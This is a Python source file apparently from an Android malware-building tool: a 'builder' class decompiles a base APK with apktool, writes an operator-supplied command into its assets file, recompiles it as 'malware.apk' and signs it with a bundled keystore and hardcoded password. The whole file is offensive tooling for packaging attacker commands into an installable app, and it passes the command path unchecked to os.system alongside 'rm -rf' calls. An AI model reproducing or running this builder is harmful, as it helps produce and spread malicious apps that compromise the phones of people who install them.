from module import manu
import os
import subprocess
class builder:
    def __init__(self):
        self.color=manu.manu()
        self.info = f"[{self.color.BLUE}info{self.color.NONE}]"
        self.worn = f"[{self.color.YELLOW}worn{self.color.NONE}]"
        self.error = f"[{self.color.RED}error{self.color.NONE}]"

    def shell(self,command):
        os.system(f"{command} > /dev/null")


    def CommandWriter(self,command):
        self.shell("rm -rf base_mod/assets/storage.txt")
        with open("base_mod/assets/storage.txt",'w') as f:
            f.write(command)
            f.close()


    def rebuild(self):
        self.shell("apktool b base_mod -o malware.apk")
        self.shell("rm -rf base_mod")

    def signapk(self):
        self.shell("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore src/key.keystore malware.apk hola -storepass iamhola")


    def build(self,path):
        print(f"{self.info} {self.color.GREEN}Decompile src/base_mod.apk{self.color.NONE}")
        self.shell("apktool d src/base_mod.apk")
        print(f"{self.info} {self.color.GREEN}Configure apk{self.color.NONE}")
        self.CommandWriter(path)
        print(f"{self.info} {self.color.GREEN}Recompile apk{self.color.NONE}\033[93m")
        self.rebuild()
        print(f"\033[0m{self.info} {self.color.GREEN}Signing apk{self.color.NONE}")
        self.signapk()
        print(f"{self.info} {self.color.GREEN}apk name malware.apk{self.color.NONE}")

